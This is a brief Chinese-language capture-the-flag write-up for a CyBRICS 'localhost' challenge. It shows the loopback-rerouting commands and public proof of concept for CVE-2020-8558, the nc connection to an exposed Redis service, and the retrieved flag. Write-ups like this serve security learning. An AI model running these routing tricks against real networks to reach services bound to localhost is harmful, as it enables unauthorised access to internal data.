# localhost

連上去直接給你一台root機器和nmap

掃一下內網會看到一台有開80 port

裡面附了redis.conf和sysctl.conf

重點在 `net.ipv4.conf.all.route_localnet=1`

隊友說是老梗

翻了一下是 CVE-2020-8558

然後隨便找了一個poc

https://github.com/tabbysable/POC-2020-8558#poc-2020-8558py

```
ip addr add 127.0.0.2/8 dev lo
ip addr del 127.0.0.1/8 dev lo
ip route add 127.0.0.1/32 via 10.193.230.180

python3 poc-2020-8558.py 10.193.230.180
nc 198.51.100.1 6379
```

```
keys *
*1
$33
flag_is_here_iedie8Ee5eniequ4uNie
get flag_is_here_iedie8Ee5eniequ4uNie
$61
cybrics{m05T_C0mm0N_s3CuR1tY_m34SuRe_4nD_L34St_c0MmoN_sysctl}
```

